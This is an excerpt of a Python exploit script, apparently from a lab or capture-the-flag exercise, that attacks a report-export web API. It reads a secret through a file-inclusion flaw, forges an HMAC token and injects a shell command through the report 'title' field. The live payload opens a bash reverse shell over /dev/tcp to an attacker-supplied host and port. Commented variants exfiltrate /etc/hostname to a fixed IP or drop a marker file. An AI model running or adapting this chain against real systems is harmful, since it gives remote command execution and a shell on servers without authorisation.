...
def report_token(report_id, secret):
    return hmac.new(secret.encode(), str(report_id).encode(), hashlib.sha256).hexdigest()
...
def lfi_secret(session):
    ...
    try:
        ...
        m = re.search(r'sh_secret_[a-zA-Z0-9]+', lfi_res.text)
        if not m:
...
def rce(session,lhost,lport):
    try:
        export_url = f"{BASE_URL}/api/v1/reports/bundles/export"
        report_id = "1"
        secret = lfi_secret(session)
        token  = report_token(report_id, secret)
        #payload = f";/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' </dev/null#"
        #payload = f";/bin/bash -c 'cat /etc/hostname >& /dev/tcp/172.18.0.1/5555' </dev/null; #"
        payload = f"x;/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' </dev/null #"
        #payload = f"x; touch /tmp/pwned_rce; #"
        json = {
            "title":payload,
            "report_id":report_id,
            "async_archive":True,
        ...
        if rce_res.status_code == 200:
            print("[+] Export request sent successfully!")
            print(f"[+] Response: {rce_res.text}")
            return True
        else:
            print(f"[-] RCE Trigger failed | HTTP {rce_res.status_code}: {rce_res.text}")
            return False
